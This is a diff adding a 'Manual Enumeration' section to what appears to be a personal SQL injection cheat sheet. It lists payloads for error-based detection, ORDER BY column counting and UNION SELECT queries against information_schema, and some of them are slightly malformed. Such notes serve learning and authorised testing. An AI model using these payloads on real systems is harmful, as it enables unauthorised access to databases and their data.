@@ -37,3 +37,17 @@
 #### Keep adding NULL until you see an error. The last correct query reveals the amount of columns in the database.
 
 ## group_concat(table_name)
+
+## Manual Enumeration
+
+#### 1) ' (Error Based)
+
+#### 2) '1 order by (num)' (column enumeration)
+
+#### 3) '1 UNION SELECT database()'
+
+#### 4) '1 UNION SELECT concat(schema_name)' from information_schema.schema'
+
+#### 5) '1 UNION SELECT table_name from information_schema.tables WHERE table_schema = database()'
+
+#### 6) '1 UNION SELECT 1, concat(+1," ",+2, " ",+3),3,4 from "name"
